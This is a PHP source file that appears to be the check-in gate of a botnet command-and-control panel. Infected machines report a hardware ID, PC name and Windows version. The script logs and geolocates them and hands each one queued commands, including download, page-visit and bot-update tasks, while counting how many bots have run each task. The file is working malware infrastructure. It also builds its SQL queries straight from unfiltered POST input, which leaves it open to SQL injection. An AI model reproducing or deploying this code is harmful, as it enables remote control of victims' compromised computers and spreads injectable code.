<?php
include('include/config.php');
include_once('geoip/geoip.inc');

if(isset($_POST['hwid'])){
	$query = "	SELECT
					ID,
					taskID
				FROM
					".$sql_table['bots']."
				WHERE HWID='".$_POST['hwid']."';";
	$result = $db->query($query);
	
	if(!$row = $result->fetch_assoc()){
	
				$GI = geoip_open('geoip/geoip.dat', GEOIP_STANDARD);
				$_POST['country'] = geoip_country_code_by_addr($GI, $_SERVER['REMOTE_ADDR']);
				$_POST['cname'] = geoip_country_name_by_addr($GI, $_SERVER['REMOTE_ADDR']);
				geoip_close($GI);

				if(empty($_POST['country'])) { $_POST['country'] = '00'; }
				
		$query = "	INSERT INTO
						".$sql_table['bots']."(PCName, BotVersion, InstTime, ConTime, Country, CName, WinVersion, HWID, IP)
					VALUES
						(
						'".$_POST['pcname']."',
						'".$_POST['botver']."',
						'".time()."',
						'".time()."',
						'".$_POST['country']."',
						'".$_POST['cname']."',
						'".$_POST['winver']."',
						'".$_POST['hwid']."',
						'".$_SERVER['REMOTE_ADDR']."'
						);"; 
		$result = $db->query($query);
	}
	else{
	$query = "	UPDATE ".$sql_table['bots']."
					SET PCName 		= '".$_POST['pcname']."',
						BotVersion 	= '".$_POST['botver']."',
						ConTime 	= '".time()."',
						WinVersion 	= '".$_POST['winver']."',
						IP 			= '".$_SERVER['REMOTE_ADDR']."'
					WHERE ID = '".$row['ID']."';";
		$result = $db->query($query);
		
		if($row['taskID']!=0){
			$query = "	SELECT
							taskID,
							endTime,
							startTime,
							command
						FROM
							".$sql_table['tasks']."
						WHERE taskID = '".$row['taskID']."'
						AND command not like '!!VISIT-PAGE*%'
						AND command not like '!!DOWNLOAD*%'
						AND command not like '!!UPDATE-BOTS*%';";
			$result = null;
			$result = $db->query($query);
			$task= $result->fetch_assoc();
			
			if($task){
				
				if(($task['endTime']>time()&&time()>$task['startTime']||$task['endTime']==0)){
					die($task['command']);
				}
			}
			else{
					$query = "	SELECT
							taskID,
							endTime,
							startTime,
							command,
							botsLeft,
							botsUsed
						FROM
							".$sql_table['tasks']."
						WHERE taskID = '".$row['taskID']."';";
					$result = null;
					$result = $db->query($query);
					$task = $result->fetch_assoc();
					
					if($task){
						$query = "	SELECT
										taskID,
										botID
									FROM ".$sql_table['done']."
									WHERE taskID = '".$row['taskID']."'
									AND botID = '".$row['ID']."';";
						$result = null;
						$result = $db->query($query);
						
						if($result->fetch_assoc()){
							$query = "	SELECT
										botID
									FROM ".$sql_table['done']."
									WHERE taskID = '".$row['taskID']."';";
							$result = $db->query($query);
							$i=0;
							while($result->fetch_assoc()){
								$i++;
							}
							
							echo "".$row['taskid']." DEBUG :".intval($task['botsUsed'])." bots: ".$i;
							
							if(intval($task['botsUsed']) >= $i){
									echo "DEL\n";
									panel_sql_request("DELETE FROM ".$sql_table['tasks']." WHERE taskID = ".$row['taskID'].";");
									panel_sql_request("DELETE FROM ".$sql_table['done']." WHERE taskID = ".$row['taskID'].";");
							}
						}
						else{
							echo $task['command'];
							$query = "	INSERT INTO ".$sql_table['done']." (taskID, botID)
										VALUES ('".$row['taskID']."', '".$row['ID']."');";
							$db->query($query);
						}
					}
					else{
						$query = "	UPDATE ".$sql_table['bots']."
									SET taskID = '0'
									WHERE ID = '".$row['ID']."';";
						$db->query($query);
						$query = "	DELETE FROM ".$sql_table['tasks']."
									WHERE taskID = '".$row['taskID']."';";
					
						$db->query($query);
					}
				}
		}
		else{
			$query = "	SELECT
							taskID
						FROM
							".$sql_table['tasks']."
						WHERE botsLeft > 0 AND startTime < ".time()."
						ORDER BY taskID;";
			$result  = $db->query($query); 
			$task = $result->fetch_assoc();
			
			if($task){
				$query = "	UPDATE ".$sql_table['bots']."
							SET taskID = '".$task['taskID']."'
							WHERE ID = '".$row['ID']."';";
				$db->query($query);
				$query = "	UPDATE ".$sql_table['tasks']."
							SET botsLeft = botsLeft-1
							WHERE taskID = '".$task['taskID']."';";
				$db->query($query);
			}
			else{
				echo "nothing to do -.-";
				$query = "	UPDATE ".$sql_table['bots']."
							SET taskID = '0'
							WHERE ID = '".$row['ID']."';";
				$db->query($query);
			}
		}
	}
}
?>